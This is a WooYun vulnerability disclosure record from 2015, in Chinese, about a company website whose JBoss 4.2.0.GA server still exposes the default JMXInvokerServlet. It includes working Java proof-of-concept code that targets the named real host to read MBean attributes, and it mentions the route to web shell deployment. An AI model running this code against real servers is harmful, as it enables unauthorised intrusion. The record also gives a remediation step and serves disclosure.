{"id": 26900, "wybug_id": "wooyun-2015-0127393", "wybug_title": "某上市软件公司官网使用的服务器未删除默认部署的有危害的web应用", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2015-07-20 08:07", "wybug_open_date": "2015-09-07 14:18", "wybug_type": "系统/服务补丁不及时", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-07：\t细节向公众公开  简要描述： 未删除服务器默认部署的web应用。通过该应用，远程攻击者可部署web shell。 详细说明：  官网使用的服务器是JBoss 4.2.0.GA，默认部署的JMXInvokerServlet未删除。通过代码远程访问该servlet（地址是/invoker/JMXInvokerServlet），可以达到同jmx-console一样的效果。   漏洞证明：  通过该代码可以获取JBoss服务器jmx上MBean的信息，分别获取的是JBoss的版本、BSHDeployer的启用情况和DeploymentScanner的启用情况，DeploymentScanner的addURL问题在很早就曝光过了。调用MBean的方法同获取信息的方法类似，毕竟访问的都是jmx的MBean服务，在这里就不作示范了。\nString url = \"http://bsoft.com.cn/invoker/JMXInvokerServlet\";\t\t\tString targetName = \"jboss.jmx:type=adaptor,name=Invoker\";\t\tInvocationContext context = new InvocationContext();\t\tcontext.setObjectName(new Integer((new ObjectName(targetName)).hashCode()));\t\tInvocation invocation = new Invocation();\t\t\t\tinvocation.setInvocationContext(context);\t\tinvocation.setId(context.getCacheId());\t\tinvocation.setObjectName(context.getObjectName());\t\t\t    invocation.setMethod(Class.forName(\"org.jboss.jmx.adaptor.rmi.RMIAdaptorExt\").getMethod(\"getAttribute\", new Class[] { Class.forName(\"javax.management.ObjectName\"), Class.forName(\"java.lang.String\") }));\t    Object[] arguments = new Object[2];\t     //get the jboss version\t    arguments[0] = new ObjectName(\"jboss.system:type=Server\");\t    arguments[1] = \"Version\";\t    /**/\t    \t    /* get the BSHDeployer's state \t    arguments[0] = new ObjectName(\"jboss.deployer:service=BSHDeployer\");\t    arguments[1] = \"StateString\";\t    */\t    \t    /*get the DeploymentScanner's state (addURL)\t    arguments[0] = new ObjectName(\"jboss.deployment:flavor=URL,type=DeploymentScanner\");\t    arguments[1] = \"StateString\";\t    */\t\tinvocation.setArguments(arguments);\t\tinvocation.setValue(InvocationKey.INVOKER_PROXY_BINDING,\t\t\t\tcontext.getInvokerProxyBinding(), PayloadKey.AS_IS);\t\tMarshalledInvocation mi = new MarshalledInvocation(invocation);\t\tURL servlet;\t\ttry {\t\t\tservlet = org.jboss.invocation.http.interfaces.Util.resolveURL(url);\t\t\tObject value = org.jboss.invocation.http.interfaces.Util.invoke(servlet, mi);\t\t\tSystem.out.println(\" \" + value.toString());\t\t\treturn;\t\t} catch (MalformedURLException e) {\t\t\t// TODO Auto-generated catch block\t\t\te.printStackTrace();\t\t} catch (Exception e) {\t\t\t// TODO Auto-generated catch block\t\t\te.printStackTrace();\t\t}\t\tSystem.out.println(\"something wrong\");\t}\n获取版本信息\n\n获取BSHDeployer的启用情况\n\n   修复方案：  将deploy文件夹下的 http-invoker.sar 删掉。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-07-24 14:17 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}